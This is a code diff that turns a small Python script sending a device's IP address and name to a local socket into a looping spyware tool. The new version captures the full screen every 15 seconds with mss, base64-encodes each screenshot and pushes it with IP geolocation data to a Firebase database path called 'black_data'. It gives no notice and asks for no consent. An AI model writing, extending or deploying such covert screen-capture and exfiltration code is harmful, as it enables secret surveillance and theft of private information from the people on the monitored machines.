@@ -1,19 +1,38 @@
-import socket
 import requests
+import time
 import platform
 import subprocess
 from bs4 import BeautifulSoup
-import json
+import mss
+import base64
+from io import BytesIO
+from PIL import Image
+import firebase_admin
+from firebase_admin import credentials, db
 
-ZAMASOU_IP = "127.0.0.1"
-ZAMASOU_PORT = 2024
+# Initialize Firebase
+cred = credentials.Certificate("path/to/your/firebase_credentials.json")
+firebase_admin.initialize_app(cred, {
+    'databaseURL': 'https://your-database-name.firebaseio.com/'
+})
+
+def capture_screen():
+    try:
+        with mss.mss() as sct:
+            screenshot = sct.shot(output='screenshot.png')
+            img = Image.open(screenshot)
+            buffered = BytesIO()
+            img.save(buffered, format="PNG")
+            return base64.b64encode(buffered.getvalue()).decode('utf-8')
+    except Exception as e:
+        print(f"Error occurred while capturing screen: {e}")
+        return None
 
 def get_ip_info():
     try:
         response = requests.get("http://ipinfo.io/json")
         data = response.json()
-        ip_address = data.get("ip")
-        return ip_address
+        return data
     except Exception as e:
         print(f"Error occurred: {e}")
         return None
@@ -56,25 +75,26 @@ def fetch_device_name_from_google(query):
         print(f"Error occurred while searching on Google: {e}")
         return query
 
-def send_data(ip, port, data):
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((ip, port))
-            s.sendall(json.dumps(data).encode())
-            print("Data sent successfully!")
-    except Exception as e:
-        print(f"Error occurred while sending data: {e}")
+def send_data_to_firebase(data):
+    ref = db.reference('black_data')
+    ref.push(data)
 
 def main():
-    ip = get_ip_info()
     device_name = get_device_name()
 
-    data = {
-        "ip_address": ip,
-        "device_name": device_name
-    }
+    while True:
+        ip_info = get_ip_info()
+        screenshot = capture_screen()
 
-    send_data(ZAMASOU_IP, ZAMASOU_PORT, data)
+        data = {
+            "device_name": device_name,
+            "ip_info": ip_info,
+            "screenshot": screenshot,
+            "timestamp": time.time()
+        }
+
+        send_data_to_firebase(data)
+        time.sleep(15)
 
 if __name__ == "__main__":
     main()
